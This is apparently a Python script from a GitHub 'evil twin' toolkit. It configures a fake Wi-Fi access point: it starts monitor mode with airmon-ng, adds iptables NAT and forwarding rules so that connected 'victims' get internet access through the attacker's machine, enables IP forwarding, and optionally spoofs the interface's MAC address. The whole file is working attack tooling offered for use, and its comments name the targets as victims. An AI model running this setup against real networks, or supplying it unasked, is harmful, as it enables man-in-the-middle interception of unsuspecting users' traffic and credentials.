#By SxNade
#https://github.com/SxNade
#CONTRIBUTE

from termcolor import colored
import os
import sys

#importing the required Libraries...

gol = '''
 ____  _   _ ____  ____      _    ____ _____ ____      _              __ ____  
|  _ \| | | |  _ \|  _ \    / \  / ___|_   _|  _ \    / \             \ \\ \ \ 
| |_) | | | | | | | |_) |  / _ \ \___ \ | | | |_) |  / _ \ _____ ____(_) |\ \ \
|  _ <| |_| | |_| |  _ <  / ___ \ ___) || | |  _ <  / ___ \_____|_____|| |/ / /
|_| \_\\___/|____/|_| \_\/_/   \_\____/ |_| |_| \_\/_/   \_\         (_) /_/_/ 
                                                                      /_/     '''

print(gol)

if len(sys.argv) != 3:
	print(colored("[*]Usage python3 Internet&Interface.py <internet-interface> <FAKE-AP-INTERFACE>", "red"))
	sys.exit(0)


print(colored("[+]This Script will Configure The IP Tables Rules and interfaces.....!", "green", attrs=['bold']))

#Capturing the user input for Interfaces to be used in EVIL-TWIN
inter_ifc = sys.argv[1]
ap_ifc = sys.argv[2]

mon_ifc = ap_ifc + "mon"


#Defining a Function That will Forward the IP table Rules and Configure the Internet Access For Victims..!
def forward(inter_ifc, ap_ifc):
    print(colored("[+]Preparing The FAKE-AP interface..!", "green", attrs=['bold']))
    os.system(f'airmon-ng start {ap_ifc} > /dev/null')
    print(colored("Configuring the internet Access..!", "green", attrs=['bold']))
    os.system(f'ifconfig {mon_ifc} up 192.168.1.1 netmask 255.255.255.0')
    os.system(f'route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1')
    os.system(f'iptables --table nat --append POSTROUTING --out-interface {inter_ifc} -j MASQUERADE')
    os.system(f'iptables --append FORWARD --in-interface {mon_ifc} -j ACCEPT')
    print(colored("Enabling IP Forwarding NOW.....!", "green", attrs=['bold']))
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    print(colored("[*]Everything SET....NOW you can run the Fake AP using start-ap file", "red", attrs=['bold']))


#Function For Changing the MAC-ADDRESS of the Fake Access Point..!
def mac_spoof():
    ans = input("Do you want to Randemize Your MAC-address....(Y/N)!")
    if ans == "Y":
        os.system(f"ifconfig {mon_ifc} down")
        os.system(f"macchanger -r {mon_ifc}")
        os.system(f"ifconfig {mon_ifc} up")
        print(colored("Succesfully Randemized MAC-address for Fake-AP"))
        sys.exit(0)

#Defining a main function that will run the whole script
def main():
    forward(inter_ifc, ap_ifc)
    mac_spoof()

	
#Finally Calling The main Function To Run the Program..!
main()
